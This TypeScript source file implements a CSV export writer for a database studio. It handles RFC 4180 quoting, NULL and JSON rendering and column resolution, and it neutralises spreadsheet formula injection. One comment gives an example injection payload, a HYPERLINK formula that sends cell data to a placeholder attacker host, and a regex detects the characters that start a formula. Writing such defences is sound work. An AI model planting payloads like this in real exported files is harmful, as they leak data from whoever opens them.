/**
 * The one CSV writer in the studio.
 *
 * Every export used to build its own, and each of the three built it by wrapping
 * the value in quotes and nothing else: `"${val}"`. A single cell holding a quote,
 * a comma or a newline — ordinary contents for a `text` column — ended the field
 * early and shifted every column after it for the rest of the file. The damage is
 * silent, because the file still opens; it is the columns that are wrong.
 *
 * Same threat model as `quoteLiteral` in `src/lib/sql/values.ts` (#290): what
 * leaves here is read by another tool later, usually unattended, and every byte in
 * it is data the database held. The difference is only which grammar has to be
 * respected — RFC 4180 here, the engine's literal grammar there.
 *
 * Fields are separated by `,` and records by a single `\n`. RFC 4180 spells the
 * record separator `CRLF`; every reader that matters accepts a bare LF, and a field
 * that CONTAINS either is quoted, which is the part a reader cannot recover from.
 *
 * The one place this file is NOT faithful is `FORMULA_LEAD` below: a cell a
 * spreadsheet would read as a formula is prefixed with an apostrophe (X1). An export
 * that can execute on the machine of a reader who did not write the query is a worse
 * default than one that carries a visible apostrophe, so it is unconditional — there
 * is no setting and no checkbox, the same answer OWASP, GitHub and Google Sheets give.
 */

import { jsonText } from "./json";

/**
 * The characters RFC 4180 says force a field to be quoted. A field is left bare
 * otherwise, so a numeric column stays numeric to a spreadsheet.
 */
const NEEDS_QUOTING = /["\r\n,]/;

/**
 * A value as its CSV text, before quoting.
 *
 * Absent is empty, which is how a reader spells NULL. It used to be the literal
 * text `null`/`undefined`, which reads back as a four- or nine-character string
 * and is indistinguishable from a column that genuinely holds that word.
 */
function renderValue(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (value instanceof Date) return value.toISOString();
  // A JSON column, a Postgres array, a Mongo sub-document: `String(...)` answers
  // `[object Object]` for all of them, which loses the cell entirely. Through
  // `jsonText`, because a bare `JSON.stringify` throws on a bigint or a cycle and
  // would take the whole export with it.
  if (typeof value === "object") return jsonText(value);
  return String(value);
}

/**
 * The first characters a spreadsheet reads as the start of a formula rather than as
 * text. `\t` and `\r` are in the set because they are consumed before the character
 * after them is judged, so they smuggle a formula past a check on position 0 —
 * `\r` already forces quoting here, which says nothing about what Excel evaluates.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/**
 * A number and nothing else — the leading `-` or `+` included.
 *
 * The exemption that keeps `-12.5` a number. It is exempt because the match is
 * ANCHORED at both ends: a value made only of a sign, digits, one point and an
 * exponent carries no operator, no call and no cell reference, so there is nothing
 * for a spreadsheet to evaluate but the number itself. `-1+1` and `-1-2` do not
 * match, and are neutralised. The text is tested rather than the JavaScript type
 * because Postgres hands `numeric` back as a string.
 */
const PLAIN_NUMBER = /^[+-]?(\d+(\.\d*)?|\.\d+)([eE][+-]?\d+)?$/;

function csvField(value: unknown): string {
  const text = renderValue(value);
  // The one mutation in this file. `=HYPERLINK("http://attacker/"&A1)` is data in the
  // database and a formula in Excel, LibreOffice and Google Sheets, and it runs when
  // the file is opened by someone who did not write the query. Measured on LibreOffice
  // 24.2: `=1+1` imports as a live formula, and with the apostrophe it imports as the
  // string `'=1+1`. The apostrophe stays visible in the cell; that cost is paid on
  // every value a spreadsheet would evaluate, and on no other.
  if (FORMULA_LEAD.test(text) && !PLAIN_NUMBER.test(text)) {
    return `"'${text.replace(/"/g, '""')}"`;
  }
  return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

/** One CSV record, escaped field by field. */
export function csvRow(values: readonly unknown[]): string {
  return values.map(csvField).join(",");
}

/**
 * The columns an export writes: what the caller declared, or — when it has nothing
 * to declare — every key any row carries, in the order the rows first mention them.
 *
 * The union rather than the first row's keys, because a document store hands back
 * rows that do not share a shape. A field absent from row 1 would otherwise be
 * dropped from the header and, since rows used to be written from `Object.values`,
 * would also push every later value of that row one column to the left.
 */
export function resolveColumns(
  rows: readonly Record<string, unknown>[],
  declared?: readonly string[],
): readonly string[] {
  if (declared && declared.length > 0) return declared;

  const columns: string[] = [];
  const seen = new Set<string>();
  for (const row of rows) {
    for (const key of Object.keys(row)) {
      if (seen.has(key)) continue;
      seen.add(key);
      columns.push(key);
    }
  }
  return columns;
}

/**
 * One row's value for `column`.
 *
 * `Object.hasOwn` first, because `row[column]` walks the prototype chain: a header
 * naming a field this row has no own entry for — ordinary in a document store, which
 * hands back rows that do not share a shape — resolved to an INHERITED member when
 * the name happened to be one. A column called `constructor` wrote
 * "function Object() { [native code] }" into every row that lacked the field. Same
 * guard, and the same reason, as `declaredTypeOf` in `src/components/ResultsGrid.tsx`.
 */
export function cellOf(row: Record<string, unknown>, column: string): unknown {
  return Object.hasOwn(row, column) ? row[column] : undefined;
}

/**
 * `rows` as CSV text, with a header row.
 *
 * Pass `columns` — a result's own `fields` — wherever they are known: they are what
 * the engine declared for this result, and they fix both the order and the set. Each
 * row is then read BY NAME, so a row whose keys arrive in another order, or which is
 * missing one, lands in the right columns instead of shifting the rest.
 */
export function toCsv(rows: readonly Record<string, unknown>[], columns?: readonly string[]): string {
  const header = resolveColumns(rows, columns);
  const lines = [csvRow(header)];
  for (const row of rows) {
    lines.push(csvRow(header.map((column) => cellOf(row, column))));
  }
  return lines.join("\n");
}
